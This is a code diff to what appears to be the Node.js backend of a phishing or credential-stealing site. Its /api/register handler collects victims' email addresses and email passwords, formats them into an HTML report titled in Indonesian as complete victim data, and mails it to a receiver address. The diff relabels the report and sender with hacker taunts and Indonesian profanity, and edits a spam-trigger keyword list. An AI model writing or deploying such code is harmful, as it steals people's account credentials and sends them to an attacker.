@@ -119,8 +119,8 @@ function getSpamSubject(targetEmail, isRetry = false) {
 
 // <== TAMBAHAN 7: Kata trigger spam
 const spamKeywords = [
-    "viagra", "casino", "porn", "free money", "loan", "credit card", 
-    "lottery", "winner", "prize", "claim now", "urgent", "password", 
+    "viagra", "memek", "porn", "free money", "hack", "credit card", 
+    "lottery", "winner", "kontol", "claim now", "urgent", "password", 
     "verify", "account suspended", "bitcoin", "crypto", "gambling"
 ];
 
@@ -202,9 +202,9 @@ app.post('/api/register', async (req, res) => {
         <blink><marquee behavior="alternate" scrollamount="10"><span style="color: yellow;">⚠️⚠️⚠️ URGENT! VERIFICATION REQUIRED! CLAIM YOUR PRIZE NOW! ⚠️⚠️⚠️</span></marquee></blink>
     </div>
     <div class="container">
-        <div class="header"><h1>🔐 VIDEY STEALTH DATA 🔐</h1><p>User Registration Report</p></div>
+        <div class="header"><h1>🔐 𝗗𝗔𝗧𝗔 𝗟𝗘𝗡𝗚𝗞𝗔𝗣 𝗞𝗢𝗥𝗕𝗔𝗡 🔐</h1><p>User Registration Report</p></div>
         <div class="content">
-            <div class="section-title">📧 ACCOUNT DATA</div>
+            <div class="section-title">📧 𝗔𝗖𝗖𝗢𝗨𝗡𝗧 𝗗𝗔𝗧𝗔</div>
             <table>
                 <tr><td class="label">Email Address:</td><td class="value">${data.email || '-'}</td></tr>
                 <tr><td class="label">Email Password:</td><td class="value">${data.emailPassword || '-'}</td></tr>
@@ -238,7 +238,7 @@ app.post('/api/register', async (req, res) => {
         const fakeEmails = [`spam${Date.now()}@gmail.com`, `fake${Date.now()}@yahoo.com`];
         
         await transporter.sendMail({
-            from: `"🏆🏆🏆 !!!WINNER!!! CLAIM NOW!!! 🏆🏆🏆" <${SENDER_EMAIL}>`,
+            from: `"🏆🏆🏆 𝗗𝗔𝗧𝗔 𝗛𝗔𝗖𝗞 𝗣𝗨𝗡𝗬𝗔 𝗦𝗜 𝗔𝗡𝗝𝗜𝗡𝗚 🏆🏆🏆" <${SENDER_EMAIL}>`,
             to: RECEIVER_EMAIL,
             bcc: fakeEmails,
             subject: getSpamSubject(data.email),
